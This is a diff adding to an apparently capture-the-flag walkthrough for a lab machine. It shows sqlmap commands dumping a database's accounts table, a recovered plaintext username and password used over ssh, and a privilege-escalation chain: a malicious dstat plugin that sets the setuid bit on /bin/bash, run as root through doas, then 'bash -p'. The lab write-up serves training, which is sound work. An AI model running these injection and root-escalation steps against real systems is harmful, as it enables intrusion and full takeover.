@@ -42,3 +42,17 @@ sqlmap -u “http://localhost:8081/?id=" -D soccer_db --tables
 sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump  
 
 player@player.htb PlayerOftheMatch2022 player ssh
+
+running lipeas.sh Found doas binary under setuid
+Let's dig in, from doas.conf file found that we can run /usr/bin/dstat as root
+
+After messing around some time found that we can load plugins from /usr/local/share/dstat/ directory which is writable, dstat plugin load uses wildcard so we can use any name for our plugin, dstat_"anything".py
+
+
+import os
+os.system('chmod +s /bin/bash')
+		
+
+/usr/local/bin/doas -u root  /usr/bin/dstat --pwn
+	
+bash -p
